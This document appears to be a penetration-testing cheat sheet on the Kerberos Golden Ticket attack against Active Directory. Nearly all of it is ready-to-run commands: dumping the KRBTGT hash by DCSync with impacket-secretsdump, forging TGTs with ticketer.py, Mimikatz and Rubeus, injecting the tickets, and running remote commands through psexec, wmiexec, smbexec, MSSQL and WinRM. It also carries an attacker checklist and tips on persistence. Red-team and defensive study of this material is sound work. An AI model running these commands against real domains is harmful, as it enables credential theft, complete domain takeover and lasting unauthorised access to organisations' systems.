# Golden Ticket Attack

## Objective

A **Golden Ticket** is a forged Kerberos **Ticket Granting Ticket (TGT)** created using the **KRBTGT account's secret key (NTLM or AES)**. Possession of the KRBTGT key allows an attacker to generate valid TGTs for any user, effectively impersonating any account in the domain until the KRBTGT password is reset (typically twice).

Unlike a Silver Ticket, a Golden Ticket is **not limited to a single service**. It can be used to request legitimate service tickets (TGS) for any service the forged identity is authorized to access.

---

# Requirements

Before creating a Golden Ticket, you need:

- KRBTGT NTLM hash **or** AES128/AES256 key
- Domain SID
- Domain FQDN
- Username to impersonate (commonly `Administrator`)

---

# How to Obtain the KRBTGT Hash

The KRBTGT hash is typically obtained after compromising a highly privileged account.

Common methods include:

- DCSync
- NTDS.dit extraction
- LSASS dump on a Domain Controller
- Domain Admin access

Example (DCSync):

```bash
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

Look for:

```text
krbtgt:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
```

---

# Collect Required Information

## Domain SID

### Windows

```cmd
whoami /user
```

### Linux

```bash
impacket-lookupsid <DOMAIN>/<USER>@<DC_IP> -hashes :<NTLM_HASH>
```

---

## Domain Name

```text
corp.local
```

---

## KRBTGT Hash

Example:

```text
krbtgt:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
```

---

# Create a Golden Ticket (Linux)

## Using NTLM Hash

```bash
ticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -nthash <KRBTGT_NTLM_HASH> Administrator
```

## Using AES128 Key

```bash
ticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -aesKey <AES128_KEY> Administrator
```

## Using AES256 Key

```bash
ticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -aesKey <AES256_KEY> Administrator
```

Output:

```text
Administrator.ccache
```

---

# Load the Golden Ticket (Linux)

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

Verify:

```bash
klist
```

---

# Use the Golden Ticket (Linux)

## SMB

```bash
impacket-smbclient -k -no-pass //<TARGET>/C$
```

## PsExec

```bash
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET>
```

## WMIExec

```bash
impacket-wmiexec -k -no-pass <DOMAIN>/Administrator@<TARGET>
```

## SMBExec

```bash
impacket-smbexec -k -no-pass <DOMAIN>/Administrator@<TARGET>
```

## MSSQL

```bash
impacket-mssqlclient -k -no-pass <TARGET>
```

## LDAP

```bash
ldapsearch -Y GSSAPI ...
```

---

# Create a Golden Ticket (Windows)

## Mimikatz (RC4 / NTLM)

```text
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /user:Administrator /ptt
```

## Mimikatz (AES128)

```text
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes128:<AES128_KEY> /user:Administrator /ptt
```

## Mimikatz (AES256)

```text
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<AES256_KEY> /user:Administrator /ptt
```

> **Note:** The `/ptt` option immediately injects the forged TGT into the current logon session.

---

# Create a Golden Ticket (Rubeus)

## Using AES256

```powershell
Rubeus.exe golden /aes256:<KRBTGT_AES256_KEY> /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /ptt
```

## Using RC4 (NTLM)

```powershell
Rubeus.exe golden /rc4:<KRBTGT_NTLM_HASH> /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /ptt
```

---

# Verify the Ticket

Windows:

```cmd
klist
```

Linux:

```bash
klist
```

---

# Request Service Tickets

After injecting the Golden Ticket, Windows or Impacket will request legitimate service tickets as needed.

Examples:

## SMB

```cmd
dir \\<TARGET>\C$
```

## WinRM

```powershell
Enter-PSSession -ComputerName <TARGET>
```

## PsExec

```bash
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET>
```

## WMIExec

```bash
impacket-wmiexec -k -no-pass <DOMAIN>/Administrator@<TARGET>
```

## MSSQL

```bash
impacket-mssqlclient -k -no-pass <TARGET>
```

---

# Cleanup

## Windows (Mimikatz)

```text
kerberos::purge
```

## Windows

```cmd
klist purge
```

## Linux

```bash
unset KRB5CCNAME
```

---

# Golden Ticket vs Silver Ticket

| Feature | Golden Ticket | Silver Ticket |
|---------|---------------|---------------|
| Ticket Type | TGT | TGS |
| Required Secret | KRBTGT hash/key | Service account hash/key |
| Scope | Entire domain | Single service |
| Contacts KDC | Yes (to request TGS tickets) | No |
| Typical Prerequisite | Domain compromise | Service account compromise |

---

# Common Use Cases

- Authenticate as any domain user.
- Request service tickets for any domain service.
- Access SMB administrative shares.
- Authenticate to WinRM.
- Execute remote commands.
- Access MSSQL.
- Query LDAP.
- Perform administrative actions across the domain.

---

# Limitations

- Requires the KRBTGT key, which generally means the domain has already been heavily compromised.
- Forged tickets become invalid after the KRBTGT password is changed (typically changed twice to invalidate existing tickets).
- Time synchronization between the attacker and the domain is important for Kerberos authentication.

---

# Tips

- Obtain the KRBTGT hash through DCSync or NTDS.dit extraction.
- Save both NTLM and AES keys if available.
- Verify injected tickets with `klist`.
- Prefer AES keys in modern environments where RC4 may be disabled.
- A Golden Ticket allows requesting legitimate service tickets for any accessible service in the domain.
- Re-run BloodHound after obtaining Domain Admin privileges to identify any remaining attack paths or persistence opportunities.

---

# Checklist

- [ ] Obtain the KRBTGT NTLM hash or AES key.
- [ ] Recover the Domain SID.
- [ ] Create a Golden Ticket.
- [ ] Inject or load the forged TGT.
- [ ] Verify the ticket with `klist`.
- [ ] Request service tickets as needed.
- [ ] Authenticate to domain services.
- [ ] Purge tickets after testing.
